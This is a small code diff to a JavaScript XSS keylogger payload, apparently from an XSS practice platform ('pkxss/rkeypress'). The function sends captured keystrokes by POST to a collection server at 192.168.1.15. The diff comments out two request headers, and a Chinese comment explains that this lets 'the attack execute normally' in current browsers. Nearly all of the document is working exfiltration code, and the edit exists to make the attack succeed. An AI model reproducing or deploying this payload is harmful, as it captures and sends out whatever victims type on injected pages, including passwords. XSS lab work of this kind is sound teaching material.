@@ -53,7 +53,8 @@ function show() {
     var postdate = xl;
     ajax.open("POST", "http://192.168.1.15/pkxss/rkeypress/rkserver.php",true);
     ajax.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
-    ajax.setRequestHeader("Content-length", postdate.length);
-    ajax.setRequestHeader("Connection", "close");
+    //目前主流浏览器会拒绝设置Content-length和Connection，注释这两行代码后攻击可正常执行
+    //ajax.setRequestHeader("Content-length", postdate.length);
+    //ajax.setRequestHeader("Connection", "close");
     ajax.send(postdate);
 }
